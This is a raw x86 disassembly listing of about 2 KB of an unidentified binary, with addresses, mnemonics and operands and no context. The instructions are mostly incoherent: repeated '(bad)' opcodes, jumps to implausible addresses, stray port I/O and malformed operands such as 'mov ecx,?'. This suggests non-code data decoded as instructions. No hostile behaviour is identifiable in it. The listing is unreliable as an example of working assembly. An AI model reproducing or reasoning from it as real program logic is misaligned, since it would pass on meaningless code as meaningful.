  436e09:	sub    edi,ecx
  436e0b:	lods   eax,DWORD PTR ds:[esi]
  436e0c:	(bad)  
  436e0d:	test   BYTE PTR [ebx-0x6c7d0116],bh
  436e13:	out    0x86,eax
  436e15:	cld    
  436e16:	or     DWORD PTR [eax],eax
  436e18:	jmp    0xe9cdeca4
  436e1d:	jbe    0x436e21
  436e1f:	jge    0x436e07
  436e21:	xchg   bx,ax
  436e23:	or     ah,BYTE PTR [ebp+0x0]
  436e26:	add    BYTE PTR [eax],al
  436e28:	add    BYTE PTR [eax],al
  436e2a:	repnz add DWORD PTR [eax],eax
  436e2d:	jmp    0xda64062d
  436e32:	push   eax
  436e33:	push   ss
  436e34:	jnp    0x436e7b
  436e36:	jbe    0x436e41
  436e38:	test   BYTE PTR [edx+0x76],dh
  436e3b:	add    al,BYTE PTR [eax]
  436e3d:	out    0xcc,al
  436e3f:	xchg   esp,eax
  436e40:	cli    
  436e41:	pushf  
  436e42:	or     bh,BYTE PTR [ebp-0x36]
  436e45:	cmp    dl,dh
  436e47:	sar    DWORD PTR [edi+eiz*1+0x6e],cl
  436e4b:	jnp    0x436ea0
  436e4d:	adc    DWORD PTR [ebx-0x46],edi
  436e50:	jge    0x436e61
  436e52:	push   ss
  436e53:	and    eax,0xf6b7c2da
  436e58:	jae    0x436def
  436e5a:	jmp    0x436ea2
  436e5c:	or     BYTE PTR [esi],ch
  436e5e:	cmp    edx,edi
  436e60:	lahf   
  436e61:	jp     0x436e99
  436e63:	add    al,cl
  436e65:	out    dx,al
  436e66:	jecxz  0x436dfa
  436e68:	stc    
  436e69:	jmp    0xd1c06f57
  436e6e:	ja     0x436e79
  436e70:	or     BYTE PTR [ecx],0x7
  436e73:	cdq    
  436e74:	stc    
  436e75:	adc    DWORD PTR [edi],0x37bef999
  436e7b:	sub    eax,0x36da6259
  436e80:	mov    esi,0x437d76e1
  436e85:	icebp  
  436e86:	icebp  
  436e87:	inc    esi
  436e88:	call   0x854997fd
  436e8d:	and    al,0x0
  436e8f:	add    BYTE PTR [eax],al
  436e91:	add    BYTE PTR [eax],al
  436e93:	jmp    0x42a57f12
  436e98:	xchg   esi,eax
  436e99:	xchg   DWORD PTR [eax],eax
  436e9b:	inc    esp
  436e9c:	mov    es,WORD PTR [edx+0x6f879050]
  436ea2:	cmp    al,0x8a
  436ea4:	jge    0x436efd
  436ea6:	cmp    BYTE PTR [edi+0x4cfffa2e],al
  436eac:	push   es
  436ead:	push   edi
  436eae:	mov    esi,DWORD PTR [ecx+0x5c08b9d1]
  436eb4:	mov    bh,0xd4
  436eb6:	xor    esp,DWORD PTR [edx+0x4c1bffbb]
  436ebc:	push   es
  436ebd:	add    bh,al
  436ebf:	adc    DWORD PTR [esi-0x7],ecx
  436ec2:	call   FWORD PTR [esi+eax*1]
  436ec5:	jecxz  0x436ece
  436ec7:	push   ebx
  436ec8:	dec    ecx
  436ec9:	fdivr  st,st(5)
  436ecb:	pop    ebx
  436ecc:	arpl   di,si
  436ece:	mov    edx,ecx
  436ed0:	std    
  436ed1:	or     BYTE PTR [ebp+0x74],0x7d
  436ed5:	dec    eax
  436ed6:	or     al,0x97
  436ed8:	inc    ecx
  436ed9:	lock mov DWORD PTR [edi+edi*2],ebx
  436edd:	dec    ebp
  436ede:	cld    
  436edf:	test   DWORD PTR [esi],edi
  436ee1:	adc    BYTE PTR [ecx+0x7f7b0a0c],cl
  436ee7:	mov    ah,0x5
  436ee9:	sbb    DWORD PTR [edi-0x6c],0x413c6f7d
  436ef0:	nop
  436ef1:	test   BYTE PTR [ebp-0x44],cl
  436ef4:	scas   al,BYTE PTR es:[edi]
  436ef5:	inc    ecx
  436ef6:	adc    BYTE PTR [eax],al
  436ef8:	add    BYTE PTR [eax],al
  436efa:	add    BYTE PTR [eax],al
  436efc:	and    BYTE PTR [ecx+0x6d4f0784],bh
  436f02:	adc    eax,0xf8876a7d
  436f07:	sbb    ch,BYTE PTR [eax-0x4]
  436f0a:	jp     0x436f89
  436f0c:	enter  0x7409,0x23
  436f10:	daa    
  436f11:	dec    eax
  436f12:	loopne 0x436e9f
  436f14:	pop    ecx
  436f15:	(bad)  
  436f16:	out    0xd,eax
  436f18:	jne    0x436ea1
  436f1a:	mov    al,ds:0x115bf0f9
  436f1f:	adc    al,0xba
  436f21:	mov    al,ds:0x9b75ffff
  436f26:	aas    
  436f27:	push   ebp
  436f28:	sub    eax,0x6af9a017
  436f2d:	add    BYTE PTR [ebx+0x4ddc0e3],cl
  436f33:	add    dh,ch
  436f35:	mov    ch,0x5
  436f37:	test   DWORD PTR [eax+0x7141ebcb],edi
  436f3d:	and    al,0x3a
  436f3f:	loopne 0x436ecf
  436f41:	imul   ebp,ebp,0xfe93b0fe
  436f47:	pop    ecx
  436f48:	mov    DWORD PTR [edx+0x5ff61c40],ebx
  436f4e:	add    eax,0xad5dec00
  436f53:	je     0x436fb9
  436f55:	es mov esp,0x201c6074
  436f5b:	adc    BYTE PTR [ebp+0x4c],dh
  436f5e:	adc    DWORD PTR [edi],ecx
  436f60:	add    BYTE PTR [eax],al
  436f62:	add    BYTE PTR [eax],al
  436f64:	add    dh,ch
  436f66:	jo     0x436f71
  436f68:	test   DWORD PTR [edx+0x47cceca3],esi
  436f6e:	imul   esp,DWORD PTR [ebp-0x2648fda],0xffffffe4
  436f75:	jb     0x436f8b
  436f77:	dec    edx
  436f78:	or     al,0xee
  436f7a:	xlat   BYTE PTR ds:[ebx]
  436f7b:	sti    
  436f7c:	and    al,0xbe
  436f7e:	leave  
  436f7f:	sub    eax,0xfd9e7ce8
  436f84:	(bad)  
  436f85:	in     al,dx
  436f86:	(bad)  
  436f88:	xchg   BYTE PTR [ebx],dh
  436f8a:	mov    eax,DWORD PTR [esi-0x12ad09ff]
  436f90:	jae    0x43700b
  436f92:	push   0x2750847
  436f97:	out    0x3,eax
  436f99:	jne    0x436f20
  436f9b:	lahf   
  436f9c:	push   cs
  436f9d:	push   es
  436f9e:	or     DWORD PTR [edx-0x17fd82b7],ebp
  436fa4:	add    esi,DWORD PTR [ebp+0x7d]
  436fa7:	xor    cl,BYTE PTR [eax]
  436fa9:	test   BYTE PTR [edx-0x4b5f3322],ch
  436faf:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  436fb1:	mov    ch,0x83
  436fb3:	outs   dx,DWORD PTR ds:[esi]
  436fb4:	or     ebp,DWORD PTR [ebp+esi*2+0x25]
  436fb8:	add    ebp,DWORD PTR [esi+0x3384acfa]
  436fbe:	and    edi,0x3
  436fc1:	jne    0x436fc6
  436fc3:	cmp    BYTE PTR [ebx],al
  436fc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  436fc6:	into   
  436fc7:	and    DWORD PTR gs:[eax],eax
  436fca:	add    BYTE PTR [eax],al
  436fcc:	add    BYTE PTR [eax],al
  436fce:	and    eax,0x61367003
  436fd3:	adc    eax,0x174088eb
  436fd8:	loope  0x436f5c
  436fda:	sahf   
  436fdb:	(bad)  
  436fdc:	jmp    0xf6bb:0xa47b8218
  436fe3:	ret    0x88e2
  436fe6:	aam    0x90
  436fe8:	or     bl,BYTE PTR [edi-0x64c0d461]
  436fee:	cld    
  436fef:	(bad)  
  436ff0:	cli    
  436ff1:	ds clc 
  436ff3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  436ff4:	xchg   esp,eax
  436ff5:	sar    DWORD PTR [ebp+0x2],0x5e
  436ff9:	dec    ecx
  436ffa:	mov    ebp,0xf03f3e30
  436fff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  437000:	cmp    al,0xc2
  437002:	jge    0x437006
  437004:	(bad)  
  437005:	popf   
  437006:	int3   
  437007:	(bad)
  43700b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43700c:	and    al,0xc2
  43700e:	ins    DWORD PTR es:[edi],dx
  43700f:	add    ch,BYTE PTR [edx]
  437011:	out    0x71,eax
  437013:	add    al,BYTE PTR [eax]
  437015:	addr16 sahf 
  437017:	into   
  437018:	dec    esp
  43701a:	xchg   ecx,eax
  43701b:	into   
  43701c:	(bad)  
  43701d:	js     0x436fa8
  43701f:	into   
  437020:	jmp    ebx
  437022:	pushf  
  437023:	into   
  437024:	jmp    FWORD PTR [ecx-0x64]
  437027:	into   
  437028:	call   esp
  43702a:	(bad)  
  43702b:	into   
  43702c:	dec    DWORD PTR [ecx+0x6cffce8f]
  437032:	add    BYTE PTR [eax],al
  437034:	add    BYTE PTR [eax],al
  437036:	add    BYTE PTR [edx-0x32],ah
  437039:	call   edi
  43703b:	gs into 
  43703d:	(bad)  
  43703e:	(bad)  
  43703f:	gs into 
  437041:	(bad)  
  437042:	jnp    0x4370a9
  437044:	into   
  437045:	dec    DWORD PTR [edi-0x3f0031bb]
  43704b:	pop    eax
  43704c:	into   
  43704d:	jmp    DWORD PTR [ebx]
  43704f:	push   eax
  437050:	into   
  437051:	push   DWORD PTR [ecx]
  437053:	dec    eax
  437054:	into   
  437055:	inc    DWORD PTR ds:0x89ffce22
  43705b:	sbb    ecx,esi
  43705d:	push   DWORD PTR [edi-0x110031ba]
  437063:	inc    edi
  437064:	into   
  437065:	(bad)  
  437066:	in     al,dx
  437067:	daa    
  437068:	into   
  437069:	push   esi
  43706b:	sub    eax,0x1d91ffce
  437070:	into   
  437071:	call   FWORD PTR [esi]
  437073:	and    dh,cl
  437075:	dec    ecx
  437077:	retf   
  437078:	int    0xff
  43707a:	inc    ebx
  43707c:	int    0xff
  43707e:	fstp   TBYTE PTR [esi-0x464c0033]
  437084:	int    0xff
  437086:	push   ecx
  437087:	scas   al,BYTE PTR es:[edi]
  437088:	int    0xff
  43708a:	pop    esp
  43708b:	scas   al,BYTE PTR es:[edi]
  43708c:	int    0xff
  43708e:	fwait
  43708f:	sahf   
  437090:	int    0xff
  437092:	inc    ecx
  437094:	pushf  
  437095:	cmp    al,0x0
  437097:	rcr    BYTE PTR [esp+edi*1+0x0],cl
  43709e:	add    BYTE PTR [eax],al
  4370a0:	mov    al,ds:0x81003c9c
  4370a5:	mov    al,ds:0xb1e0003c
  4370aa:	int3   
  4370ab:	int3   
  4370ac:	loopne 0x43705f
  4370ae:	int3   
  4370af:	int3   
  4370b0:	dec    ecx
  4370b1:	jns    0x43709f
  4370b3:	push   esi
  4370b4:	pop    ss
  4370b5:	test   DWORD PTR [edi],0x34e9fa85
  4370bb:	mov    ebx,DWORD PTR [edx+0x68c07d02]
  4370c1:	mov    eax,0x85384e84
  4370c6:	shl    DWORD PTR [ebx+eax*4+0x7b],0x40
  4370cb:	xor    al,0xd9
  4370cd:	(bad)  
  4370ce:	je     0x4370da
  4370d0:	or     al,0x7b
  4370d2:	ds sub ah,bh
  4370d5:	outs   dx,BYTE PTR ds:[esi]
  4370d6:	leave  
  4370d7:	or     DWORD PTR [eax+0x504e82fe],0x7b
  4370de:	dec    esi
  4370df:	sub    BYTE PTR [edi-0x1aedbbc],dl
  4370e5:	outs   dx,BYTE PTR ds:[esi]
  4370e6:	rol    BYTE PTR [ebx+0x46befe48],1
  4370ec:	adc    BYTE PTR [edx],al
  4370ee:	add    BYTE PTR [eax],al
  4370f0:	sbb    al,0xb3
  4370f2:	mov    ecx,0x4c3d15e
  4370f7:	add    BYTE PTR [esp+ebp*2-0x300c0009],dh
  4370fe:	push   esp
  4370ff:	ret    0x1d8
  437102:	int3   
  437103:	int3   
  437104:	add    BYTE PTR [eax],al
  437106:	add    BYTE PTR [eax],al
  437108:	add    BYTE PTR [eax+0x20ccccb2],al
  43710e:	mov    esi,0xbe20cccc
  437113:	int3   
  437114:	int3   
  437115:	jne    0x4370e5
  437117:	xchg   ah,ch
  437119:	out    dx,al
  43711a:	out    0xb,al
  43711c:	test   DWORD PTR [ebp+0x1e],ebp
  43711f:	(bad)  
  437120:	je     0x4370a8
  437122:	adc    BYTE PTR [edx],dh
  437124:	adc    dh,bh
  437126:	(bad)  
  437128:	dec    ebp
  437129:	out    dx,al
  43712a:	test   BYTE PTR [edi],0x4e
  43712d:	inc    ebp
  43712e:	fs scas al,BYTE PTR es:[edi]
  437130:	jge    0x4370eb
  437132:	lahf   
  437133:	cmp    bh,BYTE PTR [ebp-0x7b0c1902]
  437139:	sub    BYTE PTR [edi-0x58d27ad2],ch
  43713f:	das    
  437140:	test   ebp,eax
  437142:	mov    ebx,0x1847f92e
  437147:	ror    DWORD PTR [eax+eax*8],0x58
  43714b:	leave  
  43714c:	int3   
  43714d:	sub    edi,edx
  43714f:	enter  0x41cc,0xdf
  437153:	enter  0x39cc,0x4e
  437157:	mov    ah,ch
  437159:	out    dx,al
  43715a:	ins    DWORD PTR es:[edi],dx
  43715b:	add    eax,0x82abb485
  437160:	shr    BYTE PTR [ecx-0x72ac7760],0x20
  437167:	inc    esi
  437168:	sbb    al,0xc7
  43716a:	and    BYTE PTR [edx],dh
  43716c:	adc    al,0x0
  43716e:	add    BYTE PTR [eax],al
  437170:	add    BYTE PTR [eax],al
  437172:	(bad)  
  437173:	adc    BYTE PTR [edx],dh
  437175:	adc    BYTE PTR [edi-0x58f3cdf0],ah
  43717b:	dec    edx
  43717c:	pushf  
  43717d:	shl    dh,1
  43717f:	out    0xf0,al
  437181:	pop    edx
  437182:	adc    BYTE PTR ss:[edx+0x10],al
  437186:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  437187:	jmp    0x9ea43163
  43718c:	fcom   DWORD PTR [edx-0x77]
  43718f:	pop    ss
  437190:	add    bh,BYTE PTR [ebp-0x53]
  437193:	add    edx,esp
  437195:	cmp    DWORD PTR [eax],edx
  437197:	jns    0x4371cd
  437199:	cld    
  43719a:	cmp    BYTE PTR [ecx+0x38],bh
  43719d:	clc    
  43719e:	xor    bh,BYTE PTR [ecx+0x24]
  4371a1:	or     BYTE PTR ds:0x40ec2879,ah
  4371a7:	lea    edx,[edi+0x13f1b187]
  4371ad:	(bad)  
  4371ae:	mov    cl,0xbd
  4371b0:	fwait
  4371b1:	enter  0xbda9,0xb3
  4371b5:	enter  0xbdc1,0xab
  4371b9:	enter  0xbdb9,0x3c
  4371bd:	(bad)  
  4371be:	xchg   ecx,eax
  4371bf:	js     0x4371e5
  4371c1:	or     al,0xf8
  4371c3:	or     edi,edx
  4371c5:	add    edi,eax
  4371c7:	cmp    eax,0xeec58eeb
  4371cc:	pop    ss
  4371cd:	ss jmp 0x6987cfcb
  4371d3:	mov    esi,DWORD PTR [edi]
  4371d5:	xchg   DWORD PTR [eax],eax
  4371d7:	add    BYTE PTR [eax],al
  4371d9:	add    BYTE PTR [eax],al
  4371db:	cmp    ebx,edi
  4371dd:	mov    ebx,0xb42f0c6
  4371e2:	fwait
  4371e3:	and    eax,0xb80c2380
  4371e8:	mov    al,BYTE PTR [edx+0x11]
  4371eb:	je     0x4371e4
  4371ed:	xchg   DWORD PTR es:[ebx],esi
  4371f0:	mov    WORD PTR [esi+eax*8-0x39734fb0],ss
  4371f7:	sub    DWORD PTR [edi-0x40be37cd],edi
  4371fd:	sub    ecx,eax
  4371ff:	cmp    DWORD PTR [edi-0x6bec7147],edi
  437205:	aaa    
  437206:	add    DWORD PTR [edi],0x1988cc17
  43720c:	out    0xe6,eax
  43720e:	add    esi,DWORD PTR [ebp+0x2]
  437211:	add    bh,bh
  437213:	mov    ecx,0x6fd06d8d
  437218:	push   eax
  437219:	bndldx bnd1,[ecx]
  43721c:	or     al,0xde
  43721e:	fidiv  WORD PTR [esi+0x2]
  437221:	add    BYTE PTR [eax-0x1ad304f2],ch
  437227:	inc    ebp
  437228:	push   0x1e
  43722a:	sub    DWORD PTR [ecx-0x35],edi
  43722d:	dec    ecx
  43722e:	xor    al,0xd3
  437230:	cmp    eax,0xe2fc6a51
  437235:	or     BYTE PTR [ebx+0x6b],ch
  437238:	mov    ecx,?
  43723a:	jmp    0x8f02fb42
  43723f:	add    BYTE PTR [eax],al
  437241:	add    BYTE PTR [eax],al
  437243:	add    BYTE PTR [ebp-0x7b],dh
  437246:	stc    
  437247:	fidivr DWORD PTR [ecx-0x7b]
  43724a:	shr    BYTE PTR [eax-0x5e7b0d38],1
  437250:	cmp    DWORD PTR [ebp-0x76ec97f8],esp
  437256:	add    cl,ch
  437258:	jbe    0x437265
  43725a:	fisubr WORD PTR [esi+0x76]
  43725d:	add    al,BYTE PTR [eax]
  43725f:	jb     0x4372c3
  437261:	jo     0x4371fb
  437263:	pop    es
  437264:	mov    cl,0x2
  437266:	sub    eax,0x266abdfd
  43726b:	test   eax,0x28d88576
  437270:	jecxz  0x43725b
  437272:	sub    al,0xd5
  437274:	lods   eax,DWORD PTR ds:[esi]
  437275:	push   0x1e
  437277:	test   eax,0xe9f8df76
  43727c:	jbe    0x437280
  43727e:	sub    eax,0x2a69f5fd
  437283:	test   eax,0xed4edd76
  437288:	repz dec ebx
  43728a:	mov    edi,0xf8e00601
  43728f:	add    ah,bl
  437291:	(bad)  
  437292:	dec    DWORD PTR [edx+0x269881d0]
  437298:	or     al,0xff
  43729a:	sbb    dl,0x8d
  43729d:	pop    esp
  43729e:	or     BYTE PTR [ecx+0x68bf],al
  4372a4:	fdiv   QWORD PTR [ebp+0x9cfd]
  4372aa:	add    BYTE PTR [eax],al
  4372ac:	add    BYTE PTR [esp+ebx*4+0x39],al
  4372b0:	add    BYTE PTR [edi+0x4c],dl
  4372b3:	mov    ecx,0xfdb594eb
  4372b8:	pushf  
  4372b9:	adc    al,0xa4
  4372bb:	cmp    DWORD PTR [eax],eax
  4372bd:	or     eax,0x8c00f764
  4372c2:	(bad)  
  4372c3:	sub    al,BYTE PTR [ecx+edx*1]
  4372c6:	push   cs
  4372c7:	es inc eax
  4372c9:	pushf  
  4372ca:	mov    ch,0x3a
  4372cc:	or     BYTE PTR [edi],dl
  4372ce:	push   esi
  4372cf:	mov    ecx,0xd87d7cea
  4372d4:	rol    DWORD PTR [edi],0xf7
  4372d7:	js     0x4372bc
  4372d9:	jmp    0x4372d9
  4372db:	(bad)  
  4372dc:	dec    ebp
  4372de:	pusha  
  4372df:	test   DWORD PTR [eax],0x1483064c
  4372e5:	rol    DWORD PTR [esi],1
  4372e7:	push   ds
  4372e8:	inc    eax
  4372e9:	pop    esp
  4372ea:	scas   eax,DWORD PTR es:[edi]
  4372eb:	or     eax,0x3998c49d
  4372f0:	add    bh,dl
  4372f2:	inc    esi
  4372f3:	mov    ecx,0xdaf14eb
  4372f8:	popf   
  4372f9:	xchg   esp,eax
  4372fa:	mov    al,ds:0x6b710039
  4372ff:	add    BYTE PTR [eax],al
  437301:	or     al,0xaf
  437303:	or     eax,0x399cf485
  437308:	add    BYTE PTR [edi],ch
  43730a:	aad    0xb
  43730c:	mov    esi,DWORD PTR [ebp-0x23]
  43730f:	mov    esp,0xe8
  437314:	add    BYTE PTR [eax],al
  437316:	gs mov esi,0x9b750098
  43731c:	mov    WORD PTR [eax+esi*8],es
  43731f:	and    ebx,esi
  437321:	aas    
  437322:	jne    0x437348
  437324:	mov    edx,0x7ea3cebf
  437329:	fst    st(2)
  43732b:	fwait
  43732c:	std    
  43732d:	inc    DWORD PTR [esi-0x70678d61]
  437333:	fild   DWORD PTR [ebx]
  437335:	test   DWORD PTR [edi+0x6618ac5a],ebx
  43733b:	xchg   edi,eax
  43733c:	jb     0x4372d6
  43733e:	push   edi
  43733f:	fild   DWORD PTR [ebx]
  437341:	jg     0x4372da
  437343:	push   eax
  437344:	std    
  437345:	push   DWORD PTR [ebp-0x74]
  437348:	stc    
  437349:	xchg   edx,eax
  43734a:	in     eax,dx
  43734b:	mov    cl,0x3d
  43734d:	add    BYTE PTR [esi-0x26],al
  437350:	repz test BYTE PTR [ebp-0x11ef54a6],ah
  437357:	push   ebx
  437358:	mov    esi,0xa31a7de5
  43735d:	stc    
  43735e:	jne    0x4372fb
  437360:	std    
  437361:	test   BYTE PTR [ecx-0x4add8ada],cl
  437367:	fwait
  437368:	jle    0x437347
  43736a:	push   edx
  43736b:	fwait
  43736c:	std    
  43736d:	inc    DWORD PTR [esi-0x70678d71]
  437373:	pop    ebx
  437374:	std    
  437375:	test   BYTE PTR ds:0x18abda,bl
  43737b:	add    BYTE PTR [eax],al
  43737d:	add    BYTE PTR [eax],al
  43737f:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  437381:	jb     0x43731b
  437383:	push   edi
  437384:	pop    ebx
  437385:	std    
  437386:	and    ah,BYTE PTR [edx]
  437388:	fwait
  437389:	std    
  43738a:	jmp    DWORD PTR [esi-0x51]
  43738d:	jp     0x437327
  43738f:	arpl   WORD PTR [edx],ax
  437391:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  437392:	add    ebx,DWORD PTR [eax+0x33]
  437395:	repz mov ebx,es
  437398:	ret    0xf2ff
  43739b:	push   edi
  43739c:	mov    edi,esp
  43739e:	add    esi,DWORD PTR [ebp+0x7d]
  4373a1:	jmp    0x437421
  4373a3:	or     eax,0xf803a6e0
  4373a8:	stos   DWORD PTR es:[edi],eax
  4373a9:	sub    BYTE PTR [ebp+ebp*2+0x75980683],ch
  4373b0:	add    ah,bh
  4373b2:	shl    BYTE PTR [esi+0x67],cl
  4373b5:	jg     0x4373a1
  4373b7:	add    BYTE PTR [edx],0x5e
  4373ba:	mov    edx,0xd2ef9cfa
  4373bf:	jbe    0x437428
  4373c1:	pop    edi
  4373c2:	loop   0x43742e
  4373c4:	add    ch,BYTE PTR [eax-0x5e]
  4373c7:	pushf  
  4373c8:	add    edi,esp
  4373ca:	add    ecx,DWORD PTR [eax-0x2]
  4373cd:	push   ebx
  4373ce:	jl     0x43742f
  4373d0:	inc    edx
  4373d1:	out    0x82,eax
  4373d3:	retf   0xd5e1
  4373d6:	inc    esp
  4373d7:	jge    0x43735d
  4373d9:	and    esp,0xbc5eb1f1
  4373df:	xor    bl,BYTE PTR [ebp+0xc4d7]
  4373e5:	add    BYTE PTR [eax],al
  4373e7:	add    BYTE PTR [eax-0x5],dl
  4373ea:	addr16 mov ds:0x35c,al
  4373ee:	out    0x3,eax
  4373f0:	lock out dx,al
  4373f2:	push   ebx
  4373f3:	jl     0x43738c
  4373f5:	inc    edx
  4373f6:	out    0x84,eax
  4373f8:	sub    BYTE PTR [eax-0x2c8afc19],cl
  4373fe:	cli    
  4373ff:	js     0x4373de
  437401:	fsub   QWORD PTR [esi+0x28aaf803]
  437407:	stos   DWORD PTR es:[edi],eax
  437408:	(bad)  
  437409:	rcl    edx,cl
  43740b:	js     0x43740a
  43740d:	in     al,0xff
  43740f:	test   al,0x76
  437411:	jecxz  0x43740b
  437413:	jmp    0xfd70768e
  437418:	cmc    
  437419:	push   0x2a
  43741b:	test   eax,0x154ed576
  437420:	out    dx,al
  437421:	dec    eax
  437422:	mov    edi,0xf8e4e901
  437427:	jmp    0xe5c876a2
  43742c:	cmc    
  43742d:	push   0x22
  43742f:	test   eax,0x28d67d76
  437434:	push   ds
  437435:	sti    
  437436:	jle    0x437402
  437438:	jecxz  0x43743c
  43743a:	add    cl,ch
  43743c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43743d:	add    ebx,DWORD PTR [ebx-0x38338f]
  437443:	popa   
  437444:	in     al,dx
  437445:	inc    edi
  437446:	in     eax,0xe1
  437448:	mov    DWORD PTR [ebx],0x619b
  43744e:	add    BYTE PTR [eax],al
  437450:	add    BYTE PTR [edi+eax*8-0x762b9801],dl
  437457:	add    cl,ch
  437459:	jbe    0x437430
  43745b:	add    edi,DWORD PTR [esi+ecx*1-0x24]
  43745f:	aas    
  437460:	jmp    0x95c66da0
  437465:	fisttp QWORD PTR [ecx-0x1f79507]
  43746b:	ins    DWORD PTR es:[edi],dx
  43746c:	sbb    esi,edi
  43746e:	mov    bl,0xbf
  437470:	xchg   ebx,eax
  437471:	je     0x4374f0
  437473:	stc    
  437474:	mov    edx,0xe5bf0571
  437479:	dec    DWORD PTR [ecx+0x84656bf]
  43747f:	loope  0x4374df
  437481:	jbe    0x437485
  437483:	add    BYTE PTR [edx+0x22],ah
  437486:	dec    esp
  437487:	cwde   
  437488:	pop    es
  437489:	mov    ecx,0x54008502
  43748e:	mov    esi,0x648d08e3
  437493:	test   DWORD PTR [eax],0x3c2b030c
  437499:	ror    DWORD PTR [ebx],0x22
  43749c:	inc    eax
  43749d:	sbb    al,0x7c
  43749f:	fadd   st,st(1)
  4374a1:	mov    ebp,DWORD PTR [si]
  4374a4:	cmp    al,0x81
  4374a6:	or     ebx,DWORD PTR [edx]
  4374a8:	inc    eax
  4374a9:	fsub   QWORD PTR [ecx+0x2dc00f8]
  4374af:	sub    edi,DWORD PTR [ecx+ebx*2]
  4374b2:	or     esp,DWORD PTR [esi]
  4374b4:	inc    eax
  4374b5:	add    BYTE PTR [eax],al
  4374b7:	add    BYTE PTR [eax],al
  4374b9:	add    ah,cl
  4374bb:	and    esi,0x4
  4374be:	push   ss
  4374bf:	jl     0x437480
  4374c1:	jne    0x4374ae
  4374c3:	int3   
  4374c4:	push   edx
  4374c5:	test   DWORD PTR [edx-0x2c6fee0f],ebp
  4374cb:	xor    al,0x9
  4374cd:	xor    ebp,esp
  4374cf:	sbb    dl,0xff
  4374d2:	pushf  
  4374d3:	add    al,BYTE PTR [eax]
  4374d5:	rol    esp,0xf5
  4374d8:	sub    al,BYTE PTR [ecx+edi*1]
  4374db:	push   es
  4374dc:	sbb    al,BYTE PTR [eax-0x64]
  4374df:	inc    ebx
  4374e0:	inc    esi
  4374e1:	jne    0x4374de
  4374e3:	je     0x4374b5
  4374e5:	pop    esi
  4374e6:	iret   
  4374e7:	mov    ecx,0x7939cccc
  4374ec:	in     al,dx
  4374ed:	mov    edx,DWORD PTR [ecx+0x69c97cfa]
  4374f3:	mov    BYTE PTR [eax+eax*8],ch
  4374f6:	add    eax,0xd5d7000c
  4374fc:	jnp    0x262b6b9b
  437502:	shr    DWORD PTR [edi-0x9],1
  437505:	pop    ebp
  437506:	mov    ?,edx
  437508:	dec    ebx
  43750a:	jne    0x43752a
  43750c:	jle    0x4374a2
  43750e:	jne    0x4374ab
  437510:	std    
  437511:	mov    dh,0x8b
  437513:	call   0x2420:0x16cbfffd
  43751a:	jne    0x4374a4
  43751c:	mov    esp,DWORD PTR [edx+0x0]
  43751f:	add    BYTE PTR [eax],al
  437521:	add    BYTE PTR [eax],al
  437523:	cld    
  437524:	mov    eax,DWORD PTR [eax+0xa5271c0]
  43752a:	xrelease lock sbb DWORD PTR [edi+eax*1+0x1a569b75],ecx
  437533:	jne    0x4374d0
  437535:	std    
  437536:	sub    al,0xe3
  437538:	jne    0x4374c0
  43753a:	xor    dh,dh
  43753c:	(bad)  
  43753e:	inc    esi
  43753f:	pusha  
  437540:	xchg   BYTE PTR [edx-0x25eae82],al
  437546:	dec    DWORD PTR [ecx+ecx*4]
  437549:	std    
  43754a:	push   DWORD PTR [ebp+0x16]
  43754d:	sbb    DWORD PTR [esi*2-0x39d7618],esp
  437554:	jmp    0x4375d4
  437556:	shl    BYTE PTR [ecx-0x2e],0x8
  43755a:	repz fstp QWORD PTR [edx+0x3575fffd]
  437561:	test   DWORD PTR [esi-0x17],edi
  437564:	lahf   
  437565:	std    
  437566:	inc    DWORD PTR [esi+0x5b]
  437569:	xchg   BYTE PTR [esi-0x2f],bh
  43756c:	(bad)  
  43756d:	std    
  43756e:	(bad)  
  43756f:	in     al,dx
  437570:	sbb    DWORD PTR [ebp+0x12],esp
  437573:	jne    0x437510
  437575:	xchg   BYTE PTR [esi+0x25],bh
  437578:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  437579:	std    
  43757a:	(bad)  
  43757b:	in     al,dx
  43757c:	sbb    BYTE PTR [ebp+0x12],bl
  43757f:	jne    0x43751c
  437581:	xor    edi,DWORD PTR [ebp-0x333e98bf]
  437587:	add    BYTE PTR [eax],al
  437589:	add    BYTE PTR [eax],al
  43758b:	add    BYTE PTR [ecx],bh
  43758d:	add    dh,BYTE PTR [ebx]
  43758f:	(bad)  
  437590:	xor    DWORD PTR [esi-0x49d638d5],esi
  437596:	mov    esp,0x5e332188
  43759b:	jae    0x437562
  43759d:	out    dx,al
  43759e:	out    0x3,al
  4375a0:	mov    al,0x2c
  4375a2:	outs   dx,BYTE PTR ds:[esi]
  4375a3:	push   cs
  4375a4:	ins    DWORD PTR es:[edi],dx
  4375a5:	jns    0x4375fa
  4375a7:	push   ebx
  4375a8:	mov    cl,0xf9
  4375aa:	out    0x3,al
  4375ac:	(bad)  
  4375ad:	cmc    
  4375ae:	fmul   DWORD PTR [edx-0x36217962]
  4375b4:	ins    BYTE PTR es:[edi],dx
  4375b5:	jne    0x4375ff
  4375b7:	add    esi,DWORD PTR [ebp+0x2]
  4375ba:	mov    esi,cs
  4375bc:	icebp  
  4375bd:	dec    ebp
  4375be:	outs   dx,DWORD PTR ds:[esi]
  4375bf:	and    edi,DWORD PTR [eax+0x2]
  4375c2:	out    0x88,eax
  4375c4:	stc    
  4375c5:	jns    0x43755a
  4375c7:	or     BYTE PTR [ebp+0x2],dh
  4375ca:	fimul  DWORD PTR [ecx+eiz*2+0x4d]
  4375ce:	repnz pop edx
  4375d0:	popa   
  4375d1:	gs inc ecx
  4375d3:	iret   
  4375d4:	test   eax,0x8d18f00f
  4375d9:	js     0x43764e
  4375db:	or     cl,BYTE PTR [ebp-0x12]
  4375de:	out    0x3,al
  4375e0:	clc    
  4375e1:	dec    ebp
  4375e2:	outs   dx,DWORD PTR ds:[esi]
  4375e3:	xor    BYTE PTR [eax+0x2],dh
  4375e6:	out    0xcd,eax
  4375e8:	out    0xfb,al
  4375ea:	push   cs
  4375eb:	clc    
  4375ec:	mov    al,BYTE PTR [edx+ebx*1+0x5]
  4375f3:	add    BYTE PTR [eax],al
